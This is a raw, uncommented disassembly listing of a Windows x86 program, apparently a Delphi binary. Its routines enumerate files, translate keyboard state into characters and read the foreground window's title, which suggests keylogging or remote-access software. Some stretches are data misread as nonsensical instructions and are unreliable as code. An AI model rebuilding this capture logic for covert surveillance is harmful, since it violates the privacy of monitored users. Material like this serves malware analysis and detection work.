mov [ fs : eax ] esp
lea eax [ ebp - 0x15c ]
push eax
lea eax [ ebp - 0x160 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_3a655b8
mov eax [ ebp - 0x160 ]
call sub_3a65730
push eax
call FindFirstFileA
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af308f
mov eax [ ebp - 0x1c ]
push eax
call FindClose
retn
lea eax [ ebp - 0x8 ]
lea edx [ ebp - 0x130 ]
mov ecx 0x104
call sub_3a65510
test [ ebp - 0x15c ] 0x10
je r-xdata
lea eax [ ebp - 0x168 ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_3a655b8
mov edx [ ebp - 0x168 ]
lea eax [ ebp - 0xc ]
call sub_3a6556c
lea eax [ ebp - 0x164 ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_3a655b8
mov edx [ ebp - 0x164 ]
lea eax [ ebp - 0x10 ]
call sub_3a6556c
jmp r-xdata
lea eax [ ebp - 0x15c ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FindNextFileA
cmp eax 0x1
sbb eax eax
inc eax
test al al
jne r-xdata
sub_3af308f
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_3a65338
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_3a652f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af30d7
lea eax [ ebp - 0x168 ]
mov edx 0x3
call sub_3a652c4
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_3a652c4
retn
sub_3af30f4
push esi
push edi
add esp 0xffffffd8
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x4 ]
push eax
call FileTimeToLocalFileTime
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call FileTimeToSystemTime
lea eax [ esp + 0x18 ]
call sub_3a6b47c
fstp [ esp + 0x8 ]
fwait
fld [ esp + 0x8 ]
add esp 0x28
pop edi
pop esi
retn
sub_3af3138
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3af3318
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a652f4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x0
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af331f
lea eax [ ebp - 0x34 ]
mov edx 0xa
call sub_3a652c4
retn
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
xor ebx ebx
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
cmp [ ebp - 0x8 ] 0x400
jle r-xdata
jmp r-xdata
cmp ebx 0x400
jle r-xdata
inc ebx
sub [ ebp - 0x8 ] 0x400
mov eax 0x1
cmp [ ebp - 0x8 ] 0x400
jg r-xdata
cmp esi 0x400
jle r-xdata
inc esi
sub ebx 0x400
mov eax 0x2
cmp ebx 0x400
jg r-xdata
sub eax 0x1
jb r-xdata
inc [ ebp - 0xc ]
sub esi 0x400
mov eax 0x3
cmp esi 0x400
jg r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_3a6986c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_3a655b8
jmp r-xdata
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_3a6986c
push [ ebp - 0x14 ]
push r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_3a6986c
mov eax [ ebp - 0x1c ]
mov ecx 0x2
mov edx 0x1
call sub_3a65798
push [ ebp - 0x18 ]
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx 0x4
call sub_3a65634
jmp r-xdata
dec eax
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_3a6986c
push [ ebp - 0x20 ]
push r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_3a6986c
mov eax [ ebp - 0x28 ]
mov ecx 0x2
mov edx 0x1
call sub_3a65798
push [ ebp - 0x24 ]
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx 0x4
call sub_3a65634
jmp r-xdata
dec eax
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
call sub_3a6986c
push [ ebp - 0x2c ]
push r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea edx [ ebp - 0x34 ]
mov eax esi
call sub_3a6986c
mov eax [ ebp - 0x34 ]
mov ecx 0x2
mov edx 0x1
call sub_3a65798
push [ ebp - 0x30 ]
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx 0x4
call sub_3a65634
jmp r-xdata
sub_3af3378
push ebp
mov ebp esp
add esp 0xfffffe5c
push ebx
xor ebx ebx
mov [ ebp - 0x1a0 ] ebx
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x19c ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x17c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
mov eax [ ebp - 0x8 ]
call sub_3a65720
lea eax [ ebp - 0x178 ]
mov edx [ r-xdata ]
call sub_3a65d1c
xor eax eax
push ebp
push sub_3af35a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x180 ] eax
lea eax [ ebp - 0x19c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a655b8
mov eax [ ebp - 0x19c ]
lea ecx [ ebp - 0x178 ]
mov edx 0x20
call sub_3a69e98
mov ebx eax
xor eax eax
push ebp
push sub_3af3553
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af355a
lea eax [ ebp - 0x178 ]
call sub_3a69f0c
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acf2b0
lea eax [ ebp - 0x154 ]
call sub_3af30f4
fstp [ ebp - 0x188 ]
fwait
lea eax [ ebp - 0x14c ]
call sub_3af30f4
fstp [ ebp - 0x190 ]
fwait
lea eax [ ebp - 0x144 ]
call sub_3af30f4
fstp [ ebp - 0x198 ]
fwait
push [ ebp - 0x184 ]
push [ ebp - 0x188 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_3a6c124
push [ ebp - 0x18c ]
push [ ebp - 0x190 ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_3a6c124
push [ ebp - 0x194 ]
push [ ebp - 0x198 ]
lea eax [ ebp - 0x14 ]
xor edx edx
call sub_3a6c124
push r-xdata
push [ ebp - 0x164 ]
push r-xdata
push [ ebp - 0xc ]
push r-xdata
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
push [ ebp - 0x16c ]
push [ ebp - 0x170 ]
lea eax [ ebp - 0x1a4 ]
call sub_3af3138
push [ ebp - 0x1a4 ]
push r-xdata
push [ ebp - 0x164 ]
push r-xdata
lea eax [ ebp - 0x1a0 ]
mov edx 0xd
call sub_3a65634
mov edx [ ebp - 0x1a0 ]
mov eax [ ebp - 0x180 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea eax [ ebp - 0x178 ]
call sub_3a69ee8
mov ebx eax
test ebx ebx
je r-xdata
sub_3af355a
mov edx [ ebp - 0x17c ]
mov eax [ ebp - 0x180 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af35ae
lea eax [ ebp - 0x1a4 ]
mov edx 0x3
call sub_3a652c4
lea eax [ ebp - 0x178 ]
mov edx [ r-xdata ]
call sub_3a65dec
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_3a652c4
retn
sub_3af35c0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
test ebx ebx
je r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3af369a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3a7d3b8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_3a62ee0
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_3a7cdc8
lea eax [ ebp - 0x1c ]
push eax
push 0x3
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_3ae5554
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax ebx
call sub_3a7d3a0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_3a7d3b8
mov [ ebp - 0x1 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a64380
mov eax [ ebp - 0xc ]
call sub_3a64380
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_3a62efc
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_3a62efc
retn
sub_3af36ac
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov esi eax
push esp
call GetKeyboardState
mov eax ebx
mov edx 0x2
call sub_3a659c0
push 0x0
mov eax ebx
call j_sub_3a65744#2
push eax
lea eax [ esp + 0x8 ]
push eax
push 0x0
movzx edi si
push edi
call MapVirtualKeyA
push eax
push edi
call ToAscii
sub eax 0x1
jb r-xdata
mov eax ebx
call sub_3a652a0
jmp r-xdata
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx 0x1
call sub_3a659c0
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax ebx
call sub_3a652a0
sub_3af3720
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3af37ac
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af37b3
retn
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
mov ecx 0xf8
mov edx [ r-xdata ]
call sub_3a65e38
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
sub_3af37b8
add al 0x38
scasd [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi ] cl
scasd [ edi ]
add eax [ eax + eax ]
add [ eax - 0x37fc5877 ] ch
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
xor ch [ eax - 0x59ba27fd ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ ecx + esi + 0x32cc03a8 ]
test al 0x3
mov esp 0x703af5e
push esp
push ebp
jo r-xdata
test al 0x3
xor [ edi - 0x54 ] ch
add esp esp
cmp ch [ eax - 0x5340fffd ]
add ecx eax
pop ebx
lodsb [ esi ]
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax + 0x6403ab7d ]
imul ebp [ ebx + eax + sub_3ab7a0c ] 0xffffffa8
jmp r-xdata
outsd
popad
pushad
cmp [ edi + 0x3 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6403af3c ] dl
cmp [ edi - 0x50c5b6fd ] ebp
add eax [ eax ]
add [ eax ] al
add [ ebx + 0x3c ] ah
scasd [ edi ]
add ebp [ ebx + eax + 0x2a140000 ]
lodsb [ esi ]
add esi eax
cmp eax 0x5d5403a8
lodsb [ esi ]
add ebx [ eax + 0x5f ]
lodsb [ esi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax - 0x6b ]
lodsb [ esi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add eax eax
pop edi
lodsb [ esi ]
add ebx [ eax - 0x73fc5478 ]
lodsb [ esi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add edi [ eax + 0x1c03ac61 ]
bound ebp [ ebx + eax + sub_3ac6358 ]
jo r-xdata
inc ebx
add ebx [ eax + 0x63 ]
lodsb [ esi ]
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
sub_3af3ba0
pop ebp
scasd [ edi ]
add edx [ edx ]
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x636f5374
imul esp [ ebp + 0x74 ] 0x31
inc ebp
jb r-xdata
jb r-xdata
outsd
jb r-xdata
adc [ eax ] ah
jb r-xdata
add [ eax + 0x803af5e ] ch
inc ebx
push ebx
inc ebp
jb r-xdata
add [ esi + ebx * 2 ] al
scasd [ edi ]
add ecx [ edx ]
inc ebx
push ebx
inc ebx
outsd
outsb
outsb
arpl [ gs : edi + ecx ] si
test al 0x5e
scasd [ edi ]
add ecx [ eax ]
cld
imul esp [ edi + ebp * 2 + 0x72 ] r-xdata
insb
sub ebp [ ebx + eax + 0x43080068 ]
outsd
outsb
arpl [ gs : ecx + 0x72 ] si
add [ eax ] al
add ebp [ ebx + ebp - 0x54 ]
add ebp [ eax ]
or [ ebx + 0x6f ] al
outsd
jb r-xdata
add ecx [ eax ]
inc esi
outsd
jb r-xdata
outsd
jb r-xdata
add [ ebx ] al
add [ eax + 0x62 ] cl
scasd [ edi ]
add ecx [ ebx + ebp * 2 ]
insb
insb
outsd
jb r-xdata
push ebx
push 0x13776f
cmp [ ebx - 0x51 ] ah
add ecx [ esi + eax * 2 ]
add ah al
pushad
scasd [ edi ]
add ecx [ edx ]
inc esi
outsd
jb r-xdata
add [ eax + 0x703af5e ] bh
inc ebx
push ebx
xor eax 0x64616552
adc [ eax ] eax
les esp [ eax - 0x51 ]
or [ ebx + esi * 2 + 0x65 ] edx
jb r-xdata
pop es
scasd [ edi ]
popad
sldt [ fs : ebx ]
call sub_3a64380
retn
call sub_3a64350
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3af3d14
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
inc ebx
jb r-xdata
or [ ebx + esi * 2 + 0x65 ] edx
jb r-xdata
outsd
jb r-xdata
inc esi
popad
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7d3b8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax ebx
call sub_3a65390
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af3d1b
mov eax [ ebp - 0x4 ]
salc
test eax 0xa9291803
add ebx [ esp + eax * 2 ]
test eax 0xae216803
add esp [ eax + 0x3b ]
lodsd [ esi ]
add edx [ ebp + ecx * 2 - 0x589bfc57 ]
test eax 0x3c909003
scasd [ edi ]
add eax [ edi ]
imul esp [ edi + ebp * 2 + 0x72 ] 0x20100007
insd
ltr ax
pushad
scasd [ edi ]
add ecx [ eax ]
arpl [ eax + 0x32 ] di
push esp
imul ebp [ ebp + 0x65 ] 0xac001672
popad
scasd [ edi ]
add ecx [ edi ]
imul esp [ ebp + 0x6c ] 0x6c
outsd
jb r-xdata
outsd
outsb
outsb
arpl [ gs : esp + edx ] si
cmp [ edx - 0x51 ] ah
add ecx [ 0x6c6c656b ]
outsd
sub_3af3cb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_3a652a0
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3af3d14
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3a7d3b8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax ebx
call sub_3a65390
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af3d1b
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3af3d20
push ebx
add esp 0xfffffef8
mov ebx eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
call GetForegroundWindow
push eax
call GetWindowTextA
mov eax ebx
mov edx esp
mov ecx 0x105
call sub_3a65510
add esp 0x108
pop ebx
retn
sub_3af3d54
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3af3e55
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebx + 0x378 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor edx edx
mov eax [ ebx + 0x364 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor edx edx
mov eax [ ebx + 0x36c ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor edx edx
mov eax [ ebx + 0x374 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x380 ]
mov eax [ eax + 0x250 ]
mov edx 0x1
call sub_3ad8570
mov edx r-xdata
call sub_3ad84cc
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x36c ]
call sub_3aafb88
mov eax [ ebp - 0x4 ]
call sub_3a699d8
mov edx eax
mov eax [ ebx + 0x37c ]
call sub_3ae4c88
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x364 ]
call sub_3aafb88
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x37c ]
call sub_3ae4c08
mov dl 0x1
mov eax [ ebx + 0x37c ]
call sub_3ae4b38
mov eax [ ebx + 0x38c ]
mov edx [ eax ]
call [ edx + 0xd8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebx + 0x390 ]
call sub_3a9c298
mov dl 0x1
mov eax [ ebx + 0x390 ]
call sub_3a9c298
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af3e5c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3af3e7a
add [ eax ] al
push ebx
mov ebx eax
mov eax [ ebx + 0x380 ]
mov eax [ eax + 0x250 ]
mov edx 0x1
call sub_3ad8570
mov edx r-xdata
call sub_3ad84cc
mov dl 0x1
mov eax [ ebx + 0x378 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax [ ebx + 0x364 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax [ ebx + 0x36c ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax [ ebx + 0x374 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor edx edx
mov eax [ ebx + 0x394 ]
call sub_3a9c298
xor edx edx
mov eax [ ebx + 0x384 ]
call sub_3ae4b38
xor edx edx
mov eax [ ebx + 0x388 ]
call sub_3ae4b38
xor edx edx
mov eax [ ebx + 0x398 ]
call sub_3ae4b38
xor edx edx
mov eax [ ebx + 0x39c ]
call sub_3ae4b38
pop ebx
retn
sub_3af3f1b
dec [ eax + eax ]
add [ eax ] al
inc esp
jae r-xdata
xor [ ebx + eax ] 0x0
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor edx edx
mov eax [ ebx + 0x394 ]
call sub_3a9c298
xor edx edx
mov eax [ ebx + 0x384 ]
call sub_3ae4b38
xor edx edx
mov eax [ ebx + 0x388 ]
call sub_3ae4b38
xor edx edx
mov eax [ ebx + 0x398 ]
call sub_3ae4b38
xor edx edx
mov eax [ ebx + 0x39c ]
call sub_3ae4b38
pop ebx
pop ebp
retn 0x8
outsd
outsb
arpl [ gs : ecx + 0x64 ] si
outsd
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0x380 ]
mov eax [ eax + 0x250 ]
mov edx 0x1
call sub_3ad8570
mov edx r-xdata
call sub_3ad84cc
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov dl 0x1
mov eax [ ebx + 0x378 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax [ ebx + 0x364 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax [ ebx + 0x36c ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax [ ebx + 0x374 ]
sub_3af3ff1
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi ecx
mov ebx eax
mov eax [ ebx + 0x37c ]
mov edx [ eax + 0x3c ]
mov eax [ ebx + 0x384 ]
call sub_3ae4c08
mov eax [ ebx + 0x37c ]
mov edx [ eax + 0x34 ]
mov eax [ ebx + 0x384 ]
call sub_3ae4c88
mov eax [ ebx + 0x37c ]
mov edx [ eax + 0x3c ]
mov eax [ ebx + 0x388 ]
call sub_3ae4c08
mov eax [ ebx + 0x37c ]
mov edx [ eax + 0x34 ]
mov eax [ ebx + 0x388 ]
call sub_3ae4c88
mov eax [ ebx + 0x37c ]
mov edx [ eax + 0x3c ]
mov eax [ ebx + 0x398 ]
call sub_3ae4c08
mov eax [ ebx + 0x37c ]
mov edx [ eax + 0x34 ]
mov eax [ ebx + 0x398 ]
call sub_3ae4c88
mov eax [ ebx + 0x37c ]
mov edx [ eax + 0x3c ]
mov eax [ ebx + 0x39c ]
call sub_3ae4c08
mov eax [ ebx + 0x37c ]
mov edx [ eax + 0x34 ]
mov eax [ ebx + 0x39c ]
call sub_3ae4c88
mov eax [ ebx + 0x37c ]
mov edx [ eax + 0x3c ]
mov eax [ ebx + 0x3a4 ]
call sub_3ae4c08
mov eax [ ebx + 0x37c ]
mov edx [ eax + 0x34 ]
mov eax [ ebx + 0x3a4 ]
call sub_3ae4c88
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov eax [ ebx + 0x380 ]
mov eax [ eax + 0x250 ]
mov edx 0x1
call sub_3ad8570
mov edx r-xdata
call sub_3ad84cc
mov dl 0x1
mov eax [ ebx + 0x394 ]
call sub_3a9c298
xor edx edx
mov eax [ ebx + 0x378 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor edx edx
mov eax [ ebx + 0x364 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor edx edx
mov eax [ ebx + 0x36c ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor edx edx
mov eax [ ebx + 0x374 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
push 0x3e8
call Sleep
mov edx r-xdata
mov eax esi
call sub_3ae35c4
pop esi
pop ebx
retn
sub_3af419f
dec [ 0x3c000000 ]
jl r-xdata
jne r-xdata
push edx
dec ecx
dec esi
inc ebx
dec ecx
push eax
inc ecx
dec esp
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_3aeb8d0
push 0x0
push 0x0
mov eax [ rw-data ]
call sub_3a7cbbc
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_3a7d3b8
mov eax [ rw-data ]
call sub_3af35c0
push 0x0
push 0x0
mov eax [ rw-data ]
call sub_3a7cbbc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
lea eax [ ebp - 0x8 ]
call sub_3a69958
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_3ae35c4
inc [ rw-data ]
inc edx
scasd [ edi ]
add ebp eax
rcl [ edi + esi * 8 ] 0x1
dec [ edi ]
test [ edx - 0x4e000000 ] ebx
add [ ecx + r-xdata ] esp
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
pop ebp
retn 0x8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af42ed
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_3a652c4
retn
push 0x0
push 0x0
mov eax [ rw-data ]
call sub_3a7cbbc
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_3af3cb0
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_3ae35c4
sub_3af41c4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
xor eax eax
push ebp
push sub_3af42e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3ae3aec
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_3aeb8d0
push 0x0
push 0x0
mov eax [ rw-data ]
call sub_3a7cbbc
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_3a7d3b8
mov eax [ rw-data ]
call sub_3af35c0
push 0x0
push 0x0
mov eax [ rw-data ]
call sub_3a7cbbc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
lea eax [ ebp - 0x8 ]
call sub_3a69958
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_3ae35c4
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af42ed
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_3a652c4
retn
push 0x0
push 0x0
mov eax [ rw-data ]
call sub_3a7cbbc
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_3af3cb0
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_3ae35c4
sub_3af4339
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov ecx 0x21
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_3af5655
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
call sub_3ae3aec
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xd
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax rw-data
mov edx [ ebp - 0x8 ]
call sub_3a652f4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
